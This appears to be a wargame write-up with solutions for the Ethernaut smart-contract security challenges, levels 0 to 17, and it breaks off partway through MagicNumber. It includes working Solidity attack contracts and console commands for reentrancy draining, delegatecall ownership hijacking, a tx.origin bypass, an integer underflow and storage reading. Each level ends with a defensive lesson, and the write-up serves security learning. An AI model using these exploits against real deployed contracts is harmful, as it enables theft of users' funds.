# Solutions to the Ethernaut challenges

This repo is all about me solving the ethernaut challenges and giving you hints on how to solve them yourselves.

## 0. Hello Ethernaut

The goal of this level is to get fmiliar with how to interact with the current instance through the developer console. We can type in a few keywords to interact with the contract, hint: typeawait contract.password(). and you can try this too "await contract.info()".

## 1. Fallback

This is practically the first challenge and the main aim of this level is that we become the owner and reduce the balance of the contract to 0.

Note that there are only two types of accounts on Ethereum: Externally Owned Accounts (EOAs) and Smart Contract accounts. EOAs are basically user wallet addresses and they represent users interacting with Ethereum. Smart Contract accounts are accounts owned by contracts.
Let's start by figuring out how to become the owner. If you look at the contract code, the only feasible way of becoming the owner is to trigger the `receive` function. There is a `require` statement that needs to pass so we will call the `contribute` function and specify any value less than 0.001 ETH.

Thereafter we will initiate a plain ETH transfer into the contract to become the owner. To complete the second requirement, we will call the `withdraw` function to withdraw the funds out.

Also note that using static solidity version is the best practice for writing codes, always check the contract's Abi to see what functions you can call on the contract
When sending transactions we use a JSON object, curly brackets and use value
```
await contract.contribute({value: 1437});
await contract.send({value: 1437});
await contract.withdraw();
```

KEY NOTE FROM CHALLENGE:

We can send money to a Smart Contract using its fallback function (a function with no name); however, the preferred way of programming a contract to receive Ether is by adding the receive() function.

## 2. Fallout

After this challenge, we understand what an ABI (Application Binary Interface) is . I like to think of it as the public API of a Smart Contract that you can interact with from a JavaScript front-end.
In earlier versions of solidity, the constructor of a contract is defined by a function with the same name as the contract i.e. if your contract name is `Treat`, the name of your constructor needs to be `Treat` as well.

From solidity 0.5.0, this is no longer the case but we should take note here — contracts can have malicious functions that are hidden in plain sight. In this ethernaut level, the function `Fal1out` is spelt incorrectly. It is very easy to miss out on this when skimming through the code.

To become the owner, we just call the `Fal1out` function.

```
await contract.Fal1out({value: 1437});
```

A real world example for this is the famous rubixi hack, cause originally it was called DynamicPyramid but the contract name was changed before deployment to Rubixi. The constructor's name wasn't changed, allowing any user to become the creator.

## 3. Coinflip

We learn some cool things in this challenge. Like, how _not_ to introduce randomness into our Smart Contracts.

The goal of this level is to guess the `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _might_ happen but very very unlikely. Luckily for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness.
Note that generating randomness in computing is generally difficult (if not impossible). It's even more difficult in Smart Contracts because everyone can read our contract code (provided we've published the source code which we will always be expected to do).
So someone with the wrong intent or smart as some would say can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function.
If we deploy the following contract on remix and call the `attack` function, we can take over the victim contract.

```
pragma solidity ^0.8.0;

contract CoinflipAttack {
    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // Below is the same algorithm that is used by the victim contract
        // We calculate the value for side before calling the victim contract.
        // Note that will always be correct since both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally we would use import the contract here so that we can call the function directly, but this works as well.
        // This approach is useful for when we don't have access to the source code of the contract we want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

MAIN LESSON FROM CHALLENGE:
If there is a need to introduce randomness into our contract, we use a decentralized oracle to compute random numbers or atleast any legit external source to the blockchain, cause all transactions on the Ethereum blockchain are deterministic state transition operations, meaning that every transaction modifies the ecosystem in a calculable way this eventually means that there is no source of entropy or randomness within the blockchain ecosystem. That's because there's no native way in Solidity to generate a random number. And everything you write in a Smart Contract is publicly visible, including local and state variables marked as private.

## 4. Telephone

Here we learn the nuance between using the global variables "tx.origin" and "msg.sender".
tx.origin is a global variable that returns the address of the account that originally sent the call, using this for authentication allows a phishing-like attack to be possible
And we also learn the proper way to do authorization checks in our contract functions.
The way to hack this level is to understand how tx.origin works. When we call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that initiated the function from which is tx.origin.
Using the following contract on remix and calling the `hackContract` function to take over the victim contract, dont forget that we need to copy and paste the code to this level to remix inorder to be able to import it and successfully hack the level

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneHack {
    Telephone tellContract;
    constructor(address _address) public {
        tellContract = Telephone(_address);
    }
    function hackContract(address _address) public {
        tellContract.changeOwner(_address);
    }
}
```

MAIN LESSON FROM CHALLENGE:
We should never use tx.origin for authorization in the functions of our contracts.
For more info on why not to use tx.origin for authorization check this https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing


## 5. Token

In this level, there is a need to dive a bit into arithmetic operations in Solidity and also how numbers are stored in solidity memory, also with this we see what can go wrong if we make a mistake when perfoming arithmetic operations in solidity.
An example of this is adding 257 to a uint8 that currently has a zero value will result in the number 1, cause the maximum value it can store is 255 and then it's back to 0, then 1. So attackers are able to abuse code and produce unexpected logic flows thanks to these sorts of numerical caveats.
But with the release of Solidity v0.8 we don't have to use Open Zeppelin's SafeMath library for arithmetic operations anymore! With this upgrade to Solidity, our code will automatically revert on overflows and underflows.

To become the owner of this contract, we just need to pass a value > 20 since the condition in the first require statement will underflow and therefore will always pass.
balances[msg.sender] -= \_value; This is where we can trigger an arithmetic underflow and we use the transfer function to hack this smart contract
So we just get a random ETH address and then pass it 20 + 1 tokens since we are the msg.sender and we have just 20 tokens, the tx goes through but we end up with more than 20 cause of the underflow.

```
await contract.transfer(instance, 21)
```

## 6. Delegation

To get this let's first understand what delegate in itself means, Delegate basically means to entrust a task or responsibility to someone else.
DelegateCall means we take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract.
The DelegateCall opcode is identical to the standard message call, except that the code executed at the targeted address is run in the context of the calling contract along with the fact that msg.sender and msg.value remain unchanged. This opocode enables the implementation of libraries whereby developers can create reusable code for future contracts.
This function should only be used with extreme care because it's particularly risky. Side note, it's been used as an attack vector on a lot of historic hacks including The Parity Wallet Hack which allowed an attacker to steal over ~$30,000,000 USD.
So main key to solving this level here is to get a function signature for the pwn function, and we can do this by using the sha 3 web 3 tool, which we get by creating the variable of the pwnFunctionSignature
By using
var pwnFuncSignature = web3.utils.sha3("pwn()")
And then we pass the data and key for our pwnfuncsignature using
contract.sendTransaction({data: pwnFuncSignature})
So now we check the contract owner once again and we see that it’s being changed to us.

```
var pwnFuncSignature = web3.utils.sha3("pwn()")

contract.sendTransaction({data: pwnFuncSignature})
```

MAIN LESSON FROM CHALLENGE:
When we use delegatecall, we're reusing another contract's code but also giving it access to our contract's state variables. Because delegates have complete access to the contract's state, use with extreme caution because delegatecall is risky and has been used as an attack vector before.
Check below for a two series of the dangers with using delegatecall when the storage are not layered out correctly as in the original contract(link is to the part 2)
https://www.youtube.com/watch?v=oinniLm5gAM&ab_channel=SmartContractProgrammer

## 7. Force

We all know that there are afew ways to send ether to a contract, we can do this by:

1. adding a fallback function (a function with no name) that's modified as "payable"
2. adding a receive() function
3. adding a function and specifying it with the "payable" keyword

But if none of the above are added to the code of a contract, there is still one additional technique that can be used to forcefully send ETH to a contract through the use of `selfdestruct`. I now you thought about it too I also at first wonderedhow forcefully sending eth to a contract makes it vulnerable, but cone to think of it now contracts that rely on code execution for all ether sent to them can be vulnerable to attacks where ether is forcibly sent.
Deploying the below contract on remix, also don't forget that we need to  specify value before deploying the ForceAttack contract so that the  `selfdestruct` can then be able to send ETH over as since the cintract itself has been funded.

```
pragma solidity 0.8.0;

contract ForceAttack {
    constructor () public payable {

    }
    function attack (address _contractAddr) public {
        selfdestruct(_contractAddr);
    }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

If a Smart Contract is not programmed to receive Ether, there's still a way we can force money into it. We write a separate contract that self destructs by calling the global selfdestruct() function which takes an address as a parameter. And right before our contract self destructs, it sends the specified address all of its remaining balance!
Also to read more about how forcefully sending ether to contract can cause damages, check out the explanation on EtherGame from the below repo
https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether

## 8. Vault

Here we mostly learn about about storage on smart contracts and also how we can access a variable by its index in a smart contract. Very important to also understand how slotting in solidity works as this would help in the future when trying to find out ways of optimising gas for contracts.
Also we should never confuse a variable being private as being invisible, cause of course If we try accesing the private variables via another contract then they are private but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, anyone can still access it based on its index in the smart contract.

And here we can see that the password is at slot 1 since the locked boolean is at slot 0, so using the web3 tool we can get what's stored in slot 1 and then pass it on unlock the boolean and voila level passed, pass the code below to thhe terminal to do this.

```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

MAIN TAKEAWAY FROM CHALLENGE:
Data on a blockchain is never confidential, and that's because contracts store their data in their designated storage on Ethereum which anyone can query!

## 9. King

This level of the challenge is going to show us how a once popular Ponzi Scheme on Ethereum - King Of The Ether - got hacked.
This is an example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to the previous "lead", which in this case is the king. 
Someone with bad intention can just create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Since the global variable msg.sender can represent either an Externally Owned Account (a.k.a. user wallet with private key) or Smart Contract Account, once a malicious user uses the smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
Note that for this line `_victimAddress.call{value: 10000000000000000 wei}("");` since we are not indicating any specific function that means it's going to hit a fallback or a receive function when it gets executed. So in the King contrat which we are atacking this line executes the receive function.

```
pragma solidity ^0.8.0;

contract KingAttack {

    constructor(address _victimAddress) payable {
        _victimAddress.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy

This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Which caused the Ethereum blockchain to fork into the official Ethereum blockchain and Ethereum Classic.

There is a very important pattern called Checks - Effects - Interactions in Solidity, this is one of the multiple ways to secure a smart contract from a re-entrant attack, other ways include using a [mutex lock]((https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)
Using the C-E-I, we basically check if we can do something, such as checking balance, we then apply the effects of doing it on our contract, such as updating balance then we do the actual interactions on-chain with other, such as transferring money.
In this case where we have the withdrawal function with the interaction coming before the effect. This means that when we receive money from within the withdraw, things are briefly in our control until the program goes back to the withdraw function to do the effect. While we have control we can keep on calling withdraw in a loop until everything is drained and there is nothing left.

When we create the instance in this level we can see that the contract balance has a bit of ether where as we don't have any balance. using the below to check in the terminal

```
await getBalance(contract.address)
await contract.balanceOf(player)
```

So we will donate some money to create our initial balance at the target, which will allow the ``` balances[msg.sender] >= \_amount ``` to be true. Now, we can repeadetly withdraw that amount by re-entering the withdraw function. Since balance update effect happens after the transfer interaction, this will go on and on until the balance is depleted. As a defense, we could use a pull-payment approach: the account to be paid must come and withdraw their money themselves, rather than us paying the ether to them, this is also the method thats used in the minimalistic nft marketplace I deployed on IPFS under the guidance of OG Patrick Collins s/o.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface of the target contract
interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Attacker {
  address public owner;
  IReentrance targetContract;
  uint targetValue = 0.001 ether;

  constructor(address payable _targetAddr) payable {
    targetContract = IReentrance(_targetAddr);
    owner = msg.sender;
  }

  // withdraw money from this contract
  function withdraw() public {
    require(msg.sender == owner, "Only the owner can withdraw.");
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "Failed to withdraw.");
  }

  // begin attack by depositing and withdrawing
  function attack() public payable {
    require(msg.value >= targetValue);
    targetContract.donate{value:msg.value}(address(this));
    targetContract.withdraw(msg.value);
    targetValue = msg.value;
  }

  receive() external payable {
    uint targetBalance = address(targetContract).balance;
    if (targetBalance >= targetValue) {
      // withdraw at most your balance at a time
      targetContract.withdraw(targetValue);
    } else if (targetBalance > 0) {
      // withdraw the remaining balance in the contract
      targetContract.withdraw(targetBalance);
    }
  }
}
```

MAIN TAKEAWAY FROM CHALLENGE:
Always update state variables before calling functions on external contracts. And also never forget to adhere to the mutex pattern or the Checks-Effects-Interactions pattern.

## 11. Elevator

Here we are looking at interfaces, i.e how to use a contract without having to copy paste all it's code

This level is pretty tricky, but main thing here is that we should always be conscious of the visibility specifiers and state modifiers we choose to use in our function signatures. Since we don't always want certain functions to modify the state, we need to make sure that we select the right specifiers/modifiers, cause external at the `islastfloor` function allows us to change the state, so an alternative would have been to use view instead as that way we can read state but not modify it and this can save us from some attacks.
So to pass this level we can head on to remix, pass on the elevator contract and also create our elevatorAttack contract, then we call the setTop function.

Here is a short explanation to the elevatorAttack contract, we use toggle to toggle our topFloor, we initiate the elevator contract and set it to be the targetAddress, state variable is automatically set to true, which we're going to name  as toggle. We then put in the target address in the constructor and instantiate that with the elevator contract and then put it into the target variable.
The `isLastFloor` function just returns if the number we pass to it is the floor or not, but under this we change our toggle from true to false and then return it as false so as to pass the condition set by the level since it has to be false for us to continue, funny but note that the uint that’s being taken into this function doesn’t really matter, as we are just toggling the boolean state with this function.
 Now for the second function `setTop` it takes a uint and then calls the `goTo` function on the target and execute, and that’s it! Below is the code.

```
pragma solidity 0.8.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

```
pragma solidity ^0.6.0;
import './elevator.sol';

contract elevatorAttack {
    bool public toggle = true;
    Elevator public target;


    constructor(address _targetAddress) public {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle =!toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```



## 12. Privacy
This is similar to the 8th level Vault, where we read the EVM storage. Here in addition, we learn about a small optimization of EVM and how casting works.

EVM stores state variables in chunks of 32 bytes. If consecutive variables make up a 32-byte space (such as in this case 8 + 8 + 16 = 32) they are stored in the same chunk. If we were to write them elsewhere, this optimization may not have happened. 

Using this we can check for each data stored at their respective slots, where ` i ` is the slot position.

```

  web3.eth.getStorageAt(contract.address, i, console.log)


```
0: 0x0000000000000000000000000000000000000000000000000000000000000001 This is the bool public locked = true which is stored as 1.
1: 0x0000000000000000000000000000000000000000000000000000000063b3ed94 This is the uint256 public ID = block.timestamp which is the UNIX timestamp in hex, 63b3ed94  (of this block in my instance])
2: 0x00000000000000000000000000000000000000000000000000000000ed94ff0a This is the 32 byte chunk of 3 variables all captures in ed94ff0a:
uint8 private flattening = 10 which is 0a
uint8 private denomination = 255 which is ff
uint16 private awkwardness = uint16(now) which is ed94. Well, that awkwardness variable is just the block.timestamp casted to 16-bits. We already know the actual 256-bit (32-byte) value of timestamp above: 63b3ed94. When casted down 16-bits, it became ed94 (4 x 4-bit hexadecimals).
3: 0x84221c8dbda8c1eaa07c361597d02f125e1c14f80c68be67430b916bf28b6955 This is data[0].
4: 0x47bcb629da52fce854213615f7cc9ab9a93bb3e25f635850291221fbd5101a8b This is data[1].
5: 0x0bc2b4c5a5e81ccd11ef655edeae12c652e74a0290dff9b898301215dfc4d1d5 This is data[2].
Now we just need data[2] casted down to bytes16. Here is how casting works in very few words:

Conversion to smaller type costs more signficant bits. (e.g. uint32 -> uint16)
Conversion to higher type adds padding bits to the left. (e.g. uint16 -> uint32)
Conversion to smaller byte costs less significant bits. (e.g. bytes32 -> bytes16)
Conversion to larger byte add padding bits to the right. (e.g. bytes16 -> bytes32)
So, when we cast down data[2] we will get the left-half of it: '0x0bc2b4c5a5e81ccd11ef655edeae12c652e74a0290dff9b898301215dfc4d1d5'.slice(0, 2 + 32) and then await contract.unlock('0x0bc2b4c5a5e81ccd11ef655edeae12c6'). That is all! 

Alternatively, If you'd like to use remix we can create our attack contract and then pass in the data[2] as bytes 32 to be converted to bytes 16 and then unlock the level via a contract and not our EOA

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0; 

import './Privacy.sol';

contract PrivacyAttack {
    Privacy target;
    
    constructor(address _targetAddr) public {
        target = Privacy(_targetAddr);
    }

    function unlock(bytes32 _storedValue) public {
        bytes16 key = bytes16(_storedValue);
        target.unlock(key);
    }
}

```



MAIN TAKEAWAY FROM CHALLENGE:

Nothing is private on the Ethereum blockchain!

State variables get stored in index-based slots, and the order of how we list our variables in our contracts matter.  Ordering our contract's state variables inefficiently can result in poorly optimized storage space which will lead to higher gas costs.

Casting is the process of converting a variable of one type to another type.  Because Solidity is a strictly typed language, we need to know how to do this.

## 13. Gatekeeper One

This level is probably the most challenging so far since we'll need to be able to pass 3 obstacles to be able to register as an entrant.

1. Simple msg.sender != tx.origin.
2. A cute gasLeft().mod(8191) == 0.
3. A series of require's telling us what the gate key must look like.

Gate 1
Solution to the first gate is trivial, just use a contract as a middleman. From previous puzzles we have learned that msg.sender is the immediate sender of a transaction, which may be a contract; however, tx.origin is the originator of the transaction which is usually us.

Gate 2
Here we have to ensure that remaining gas is an integer multiple of 8191, running the loop below  is the best way I found online while researching on how to solve this level, 
```
 for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(gKeeperOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature(("enter(bytes8)"),
      key
    ));
```
Cause using this method we are brute forcing the key rather than having to use trial ad error to match the mod condition
` require(gasleft() % 8191 == 0) `
Gate 3
We are using an 8-byte key, so suppose the key is ABCD where each letter is 2 bytes (16 bits).

CD == D so C: must be all zeros.
CD != ABCD so AB must not be all zeros.
CD == uint16(tx.origin): C is already zeros, and now we know that D will be the last 16-bits of tx.origin.
This means that the integer key, when converted into various byte sizes, need to fulfil the following properties:

0x11111111 == 0x1111, which is only possible if the value is masked by 0x0000FFFF
0x1111111100001111 != 0x00001111, which is only possible if you keep the preceding values, with the mask 0xFFFFFFFF0000FFFF
3. Calculate the key using the0xFFFFFFFF0000FFFF mask:
```
bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
```
Alternatively, we can get our uint16(tx.origin); and then just set AB = 0x 0000 0001 to get \_gateKey = 0x 0000 0001 0000 XXXX, where XXXX is uint16(tx.origin)
Below is the Gatekeeper attacking code to use in remix
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Gatekeeper.sol';

contract AreYouTheKeyOwner{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x5899BD5B5CE8072a; //last 16 digits of our account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gKeeperOne;
    

    function setGatekeeperOne(address _addr) public {
    gKeeperOne = GatekeeperOne(_addr);
}

function AlowMeIn() public{
    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(gKeeperOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature(("enter(bytes8)"),
      key
    ));
      if(result)
        {
        break;
      }
    }
   }

}
```

Whew, that was a lot, advisably check what masking opearations to understand more on how the 3rd gate was passed

MAIN TAKEAWAY FROM CHALLENGE:
Always remember that data corrupts when converted to diferent types or sizes, and also masking optimises gas as this way there are less operations instead of typecasting, and lastly asserting gas consumptions in contracts is not really a smart thing to do as different compiler settings will yield different results.


## 14. Gatekeeper Two

Very similar to the previous level except it requires us to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address.
2. At first you might think `gateTwo` is a bit tricky because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor!
   Here is the real gate

```
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

The extcodesize basically returns the size of the code in the given address, which is caller for this case. Contracts have code, and user accounts do not. So some developers might want only EOAs to interact with their contracts and have this as a requirement, but from this challenge we can already see that `extcodesize` being equal to zero does not necessarily mean that the caller is an EOA.
Here is the trick of this gate: extcodesize returns 0 if it is being called in the constructor!  
In short, we have to execute our attack from within the constructor, cause when we first deploy a contract, the extcodesize of that address is 0 until the constructor is completed!
Check this stack convo for more understanding on extcodesize "https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642"

3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.
   This is an XOR operation (often denoted with ⊕), and there is really only one parameter we can control here: the gate key. XOR has the property that if the same value XORs itself they cancel out; also, XOR is commutative so a ⊕ b = b ⊕ a. Starting with a ⊕ b = c, XOR both sides with a we get a ⊕ a ⊕ b = c ⊕ a, and the left side cancels out to give b = c ⊕ a.

One more thing: (uint64(0) - 1) causes is not really good for Solidity, and even caused gas estimation errors for me! The result is basically the maximum possible value of uint64, and we have a cool way to find it via type(uint64).max.

We can safely find the gate key as:

```
bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
```

Note that as of solidity 0.8.0, you cannot do uint64(0) - 1 unless it's done inside an uncheck scope.

```
pragma solidity ^0.8.0;

contract AttackGatekeeperTwo {

    constructor(address _victim) {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _victim.call(payload);
        require(success, "failed...");
    }

    function passGateThree() public view returns(bool) {
        // if a ^ b = c then a ^ c = b;
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
        // would be rewritten as
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == type(uint64).max;
    }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

Checking for a contract's code size during construction of that contract using the EXTCODESIZE opcode, you're going to get an empty value because the contract has not been fully constructed yet. During construction, the contract will receive a pre-made address but its size will be zero until construction is complete.
We can create zombie contracts by stopping a contract's initialization. Meaning, the contract has an address but no associated code.

## 15. Naught Coin

Here we have a simple ERC-20 contract in our hands, that prevents us to transfer money to someone. However, this is a bad implementation as the idea of this contract is to lock our tokens for 10 years, It overrides the `transfer()` method and the lockTokens modifier is being used to block us from transferring our tokens, but this does not prevent us to approve that someone, and let them call transferFrom to take our money. Cause from the NaughtCoin contract we can see that only the  `transfer()` function is guarded by the 10 years as all other ERC20 functions were not overridden including the famous `transferFrom()` :) That is precisely what we are going to do. We use the `approve()` to approve us the players in sending our token and the we use the `transferFrom` to milk the balance to zero.
After getting our new instance we can check the balance using the first line from the codes written below, then we can also check the current allowance to know if we can use the `transferFrom` function to withdraw and of course at first we can't, so we approve with the third line, now we can use the `transferFrom` function.

```
(await contract.balanceOf(player)).toString();

(await contract.allowance(player, player)).toString();

await contract.approve(player, "1000000000000000000000000");

(await contract.allowance(player, player)).toString();
```
Now since all has been approved we transfer the funds and the level is done
```
const value = "1000000000000000000000000";
await contract.transferFrom(player, [another wallet], value);

//Checking our balance again should return 0:

(await contract.balanceOf(player)).toString();

```

On a side note, the comands used in the terminal for this level  are known as Immediately Invoked Function Expressions (IIFE), pretty interesting and would advise to check up on 
https://www.geeksforgeeks.org/immediately-invoked-function-expressions-iife-in-javascript/

MAIN TAKEAWAY FROM CHALLENGE:

There are two ways to transfer tokens from an ERC20 token: by using the transfer() method, or performing a delegated transfer by using both approve() and transferFrom() in conjunction with each other. With delegated transfers, an account can approve another account to send tokens on its behalf.
Also while implementing ERC interfaces all available functins shoould be implemented to avoid vulnerablities like this among others, also newer protocols like ERC223, ERC827, ERC721 (used by Cryptokitties) advisable should be considered rather than older ones.



## 16. Preservation
Here we need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. 
For example when Contract A delegates a function call to Contract B then the B’s code is executed with storage of A and this storage is in the form of slot system, where in each slot can store 256 bits of data.
The given contract for this ethernaut level actually suffers from a bug, which we used as an exploit in the 6th level (Delegation). Her when we call setFirstTime, it actually overwrites the value in timeZone1Library storage variable!

In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setFirstTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!

Note: it is important to use the same function name as in LibraryContract because Preservation.sol invokes functions by name:
```
bytes4(keccak256(“setTime(uint256)”));
```

Using the contract below owning this contract can be acheived.
```
pragma solidity ^0.8.0;

contract PreservationAttack {

    // stores a timestamp
    address MalicioustimeZone1Library;
    address MalicioustimeZone2Library;
    address maliciousIndex;

    function setTime(uint _time) public {
        maliciousIndex = address(uint160(_time));
    }
}

await contract.setFirstTime("<insert the uint value of your malicious library contract>")
await contract.setFirstTime("<insert the uint value of your player>)

```
MAIN TAKEAWAY FROM CHALLENGE:
Do not forget that ideally, libraries should not store state and quoting the author's message: "This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."

The order in which we list state variables in a contract correspond to slots in storage, and require particular attention when using delegatecall.
A great explanation on topics related to how this level is solved can be found on here https://medium.com/coinmonks/ethernaut-lvl-16-preservation-walkthrough-how-to-inject-malicious-contracts-with-delegatecall-81e071f98a12


## 17. Recovery
Solving this level we need to figure two things out, first the address of the new contract and then secondly we call the `selfdestruct()` function and transfer all the funds to any address we chose.
After reading the solidity docs, we know that contract addresses are deterministic and are calculated by `keccack256(RLP_encode(address, nonce))`. The nonce for a contract is the number of contracts it has created. All nonce's are 0 for contracts, but they become 1 once they are created (the completion of the creation makes the nonce 1). So here we need the creator address and the nonce, since we already know the recovery address, which in this case is our level instance address, we can calculate the contract address using this and the nonce, the nonce here is going to be one cause the receovery contract has gone through only one transaction.
We might need to read more about Read about RLP encoding in the Ethereum docs 
An easier way is to use etherscan to find out our generated contract address, since we already have our instance address we can go on etherscan and find out the address of the generated contract, now for this level after generating a new instance we can see that there are five transactions atttached:
- First, we send 0.001 ETH to the Ethernaut contract
- Which will create the Recovery contract for us
- The `generateToken()` method is called
- The SimpleToken contract is then created and we can get the address in this step
- Lastly, 0.001 ETH is transfered to the SimpleToken contract

Clicking on the address we can see that there is a balance of 0.001 ether that we need to siphon to pass the level


A function called `destroy()` exists which calls `selfdestruct()`. `selfdestruct()` is a way for us to "destroy" a contract and retrieve the entire eth balance at that address. So we can use the below contract to do that on remix, we just need to make sure that we've copied and imported the level's conract too to remix 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SimpleToken.sol";
contract Attack {
    address payable me;
    SimpleToken instance;
    function attack(address payable originalContract) public {
        me = payable(msg.sender); // or we can pass in our address instead of msg.sender, but same thing :)
        instance = SimpleToken(originalContract); // instantiate the remote contract
        instance.destroy(me); // call the method on the Token contract
    }
}
```

Easy way explained above already that's by using etherscan to look for the new generated address, so another way to get the new generated contract address as explained in this link https://ethereum.stackexchange.com/questions/98700/find-address-of-a-contract-before-deployment-in-hardhat-and-ethers-js
That's by running this script on node we precalculate the address of the token contract, where we pass the level's instance address to `from`
```
const { getContractAddress } = require("@ethersproject/address");

const futureAddress = getContractAddress({
    from: "0xfbC9ddF2BBfAf7A274Da8155903be18D20b9C4d5",
    nonce: 1,
});

console.log(futureAddress);
```
MAIN TAKEAWAY FROM CHALLENGE:

Smart Contract addresses are computed deterministically and can be predicted in advance.  So if we lose a contract's address, we can retrieve it by computing the result of a deterministic formula.  Or if we have the address of the Externally Owned Account that created the contract, we can use Etherscan and find the contract's address there.
Advisably to check up on how the RLP-encoding works.
Below is the deterministic formula:

lostAddress = rightmost_20_bytes(keccak(RLP(senderAddress, nonce)));

## 18. MagicNumber
This level is not really a security challenge but rather it just teaches us the basics of the Ethereum Virtual Machine (EVM) like bytecode and opcodes, and how contracts get created when first deployed.
What happens while initialising a contract?
First things first, an EOA or contract sends a transaction to the Ethereum network. This transaction contains data, but no recipient address. This indicates to the EVM that the request is that of a contract creation, not a regular send/call transaction.
Second, the EVM compiles the contract code in Solidity (a high level, human readable language) into bytecode (a low level, machine readable language). This bytecode directly translates into opcodes, which are executed in a single call stack.
Important to note that contract creation bytecode contains both 1)initialization code and 2) the contract’s actual runtime code, concatenated in sequential order.
While a contract is being created, the EVM only executes the initialization code until it reaches the first STOP or RETURN instruction in the stack. During this stage, the contract’s constructor() function is run, and the contract has an address.
After this initialization code is run, only the runtime code remains on the stack. These opcodes are then copied into memory and returned to the EVM.
Finally, the EVM stores this returned, surplus code in the state storage, in association with the new contract address. This is the runtime code that will be executed by the stack in all future calls to the new contract.

So in order to solve this level, we need to set of opcodes, which are the 
- Initialization opcodes: These are run immediately by the EVM to create and store our the future runtime opcodes.


- Runtime opcodes: This opcode contains the actual execution logic that's needed, And this is the main part of our code thay should return 0x `0x42` and still be under 10 opcodes.

By firstly figuring out the runtime code logic. The level constrains us to only 10 opcodes. Luckily, to return 0x42 we do not need more than that.

Returning values is handled by the `RETURN` opcode, which takes in two arguments:

p: the position where our value is stored in memory, i.e. 0x0, 0x40, 0x50. Let’s arbitrarily pick the 0x80 slot.
s: the size of our stored data. Recall our value is 32 bytes long (or 0x20 in hex).
Ethereum memory looks like this, with 0x0, 0x10, 0x20… as the official position references:


Now this brings us to a point whwere we find out that before we can return a value, first youwe have to store it in memory.

